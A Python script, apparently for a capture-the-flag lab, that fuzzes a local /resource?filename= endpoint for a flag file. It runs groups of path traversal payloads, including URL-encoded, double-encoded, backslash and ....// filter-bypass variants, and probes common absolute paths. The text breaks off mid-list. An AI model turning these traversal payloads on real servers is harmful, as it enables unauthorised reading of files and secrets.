import requests
import urllib.parse
import base64

base_url = "http://127.0.0.1:33087"
endpoint = "/resource"

def test_path(path, description):
    """Test a single path and print the results"""
    url = f"{base_url}{endpoint}?filename={path}"
    try:
        response = requests.get(url, timeout=10)
        status = response.status_code
        content_preview = response.text[:300] if response.text else ""
        
        # Print results
        print(f"\n[{status}] {description}")
        print(f"  URL: {url}")
        if status == 200:
            print(f"  ✓ SUCCESS - Content preview: {content_preview[:200]}")
            if len(content_preview) > 200:
                print(f"  [... truncated ...]")
        elif status == 404:
            print(f"  ✗ Not found (or filtered)")
        elif status == 400:
            print(f"  ! Bad request (possible filter triggered)")
        else:
            print(f"  ? Status {status}")
        
        return {
            'path': path,
            'description': description,
            'status': status,
            'content': response.text if status == 200 else None,
            'error': None
        }
    except Exception as e:
        print(f"\n[!] ERROR with {description}: {e}")
        return {
            'path': path,
            'description': description,
            'status': None,
            'content': None,
            'error': str(e)
        }

print("=" * 70)
print("RESOURCE ENDPOINT FUZZING & FILTERING ANALYSIS")
print("=" * 70)

results = []

# Test 1: Direct flag filenames
print("\n\n[TEST GROUP 1] Direct Flag Filenames")
print("-" * 70)
test_cases_1 = [
    ("flag", "Direct: flag"),
    ("flag.txt", "Direct: flag.txt"),
    ("FLAG", "Direct: FLAG"),
    ("FLAG.txt", "Direct: FLAG.txt"),
    ("flag.php", "Direct: flag.php"),
    ("flag.html", "Direct: flag.html"),
    (".flag", "Direct: .flag (hidden file)"),
    ("secret.txt", "Direct: secret.txt"),
    ("secret", "Direct: secret"),
    ("notes.txt", "Direct: notes.txt"),
]

for path, desc in test_cases_1:
    results.append(test_path(path, desc))

# Test 2: Relative paths
print("\n\n[TEST GROUP 2] Relative Path Variations")
print("-" * 70)
test_cases_2 = [
    ("./flag", "Relative: ./flag"),
    ("./flag.txt", "Relative: ./flag.txt"),
    ("./FLAG", "Relative: ./FLAG"),
    ("./.flag", "Relative: ./.flag"),
    ("./secret.txt", "Relative: ./secret.txt"),
    ("/../flag", "Relative: /../flag (leading slash)"),
    ("./../flag", "Relative: ./../flag"),
]

for path, desc in test_cases_2:
    results.append(test_path(path, desc))

# Test 3: Absolute paths (common locations)
print("\n\n[TEST GROUP 3] Absolute Path Attempts")
print("-" * 70)
test_cases_3 = [
    ("/flag", "Absolute: /flag"),
    ("/flag.txt", "Absolute: /flag.txt"),
    ("/tmp/flag", "Absolute: /tmp/flag"),
    ("/tmp/flag.txt", "Absolute: /tmp/flag.txt"),
    ("/var/flag", "Absolute: /var/flag"),
    ("/var/flag.txt", "Absolute: /var/flag.txt"),
    ("/app/flag", "Absolute: /app/flag (common web app location)"),
    ("/app/flag.txt", "Absolute: /app/flag.txt"),
    ("/home/flag", "Absolute: /home/flag"),
    ("/home/flag.txt", "Absolute: /home/flag.txt"),
    ("/opt/flag", "Absolute: /opt/flag"),
    ("/opt/flag.txt", "Absolute: /opt/flag.txt"),
]

for path, desc in test_cases_3:
    results.append(test_path(path, desc))

# Test 4: Directory traversal attempts
print("\n\n[TEST GROUP 4] Path Traversal Patterns")
print("-" * 70)
test_cases_4 = [
    ("../flag", "Traversal: ../flag"),
    ("../flag.txt", "Traversal: ../flag.txt"),
    ("..%2fflag", "Traversal: ..%2fflag (URL encoded slash)"),
    ("%2e%2e%2fflag", "Traversal: %2e%2e%2fflag (fully encoded)"),
    ("....//flag", "Traversal: ....//flag (double dot bypass)"),
    ("..././flag", "Traversal: ..././flag (triple dot)"),
    ("..\\flag", "Traversal: ..\\flag (backslash)"),
    ("%2e%2e%5cflag", "Traversal: %2e%2e%5cflag (encoded backslash)"),
    ("..%252fflag", "Traversal: ..%252fflag (double encoded)"),
    ("....//....//flag", "Traversal: ....//....//flag"),
]

for path, desc in test_cases_4:
    results.append(test_path(path, desc))

# Test 5: Web-specific directories
print("\n\n[TEST GROUP 5] Web Application Directories")
print("-" * 70)
test_cases_5 = [
    ("static/flag", "Web dir: static/flag"),
    ("static/flag.txt", "Web dir: static/flag.txt"),
    ("assets/flag", "Web dir: assets/flag"),
    ("assets/flag.txt", "Web dir: assets/flag.txt"),
    ("public/flag", "Web dir: public/flag"),
    ("public/flag.txt", "Web dir: public/flag.txt"),
    ("resources/flag", "Web dir: resources/flag"),
    ("resources/flag.txt", "Web dir: resources/flag.txt"),
    ("files/flag", "Web dir: files/flag"),
    ("files/flag.txt", "Web dir: files/flag.txt"),
    ("uploads/flag", "Web dir: uploads/flag"),
    ("uploads/flag.txt", "Web dir: uploads/flag.txt"),
]

for path, desc in test_cases_5:
    results.append(test_path(path, desc))

# Test 6: Double encoding variations
print("\n\n[TEST GROUP 6] Double Encoding Attempts")
print("-" * 70)
test_cases_6 = [
    (urllib.parse.quote("../flag.txt", safe=''), "Double enc: ../flag.txt"),
    (urllib.parse.quote("..%2fflag", safe=''), "Double enc: ..%2fflag"),
